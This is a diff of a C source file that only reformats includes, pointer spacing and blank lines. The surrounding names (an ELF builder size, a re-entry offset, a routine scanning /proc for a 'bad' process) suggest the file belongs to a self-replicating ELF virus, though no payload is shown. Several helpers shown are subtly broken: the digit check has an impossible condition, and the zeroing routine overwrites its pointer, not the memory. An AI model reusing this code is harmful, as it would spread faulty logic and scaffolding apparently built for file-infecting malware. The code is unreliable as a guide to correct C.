@@ -1,4 +1,3 @@
-#include "sys/types.h"
 #include <dirent.h>
 #include <elf.h>
 #include <fcntl.h>
@@ -7,6 +6,7 @@
 #include <stdio.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
+#include <sys/types.h>
 
 #define BUILDER_SIZE 0x151;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
@@ -87,9 +87,8 @@ __attribute__((always_inline)) inline int ft_strnstr(volatile char *haystack, vo
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
 __attribute__((always_inline)) inline int ft_sstrnstr(volatile char *haystack, volatile char *needle, size_t size, size_t NEEDLE_SIZE);
 
-
 __attribute__((always_inline)) inline void
-ft_strcat(volatile char* dst, volatile char* src) {
+ft_strcat(volatile char *dst, volatile char *src) {
     while (*dst) {
         dst++;
     }
@@ -147,7 +146,7 @@ print_number(volatile uint64_t num) {
 }
 
 __attribute__((always_inline)) static inline volatile int
-ft_isdigit(const volatile char* const s) {
+ft_isdigit(const volatile char *const s) {
     for (volatile int i = 0; s[i]; ++i) {
         if (s[i] < '0' && s[i] > '9') {
             return 0;
@@ -157,7 +156,7 @@ ft_isdigit(const volatile char* const s) {
 }
 
 __attribute__((always_inline)) static inline volatile char *
-ft_strchr(volatile char*  s, const volatile char c) {
+ft_strchr(volatile char *s, const volatile char c) {
     while (*s) {
         if (*s == c) {
             return s;
@@ -167,7 +166,8 @@ ft_strchr(volatile char*  s, const volatile char c) {
     return 0;
 }
 
-__attribute__((always_inline)) static inline void ft_bzero(volatile char* bytes, volatile size_t len) {
+__attribute__((always_inline)) static inline void
+ft_bzero(volatile char *bytes, volatile size_t len) {
     for (volatile int i = 0; i < len; ++i) {
         bytes = 0;
     }
@@ -191,9 +191,8 @@ bad_process_running() {
     path[0] = 0;
     ft_strcat(path, slash_proc);
 
-
     while (1) {
-        volatile int64_t bytes_read = ft_getdents64(dirfd, (char*)getdents_buf, sizeof(getdents_buf));
+        volatile int64_t bytes_read = ft_getdents64(dirfd, (char *)getdents_buf, sizeof(getdents_buf));
         if (bytes_read <= 0) {
             break;
         }
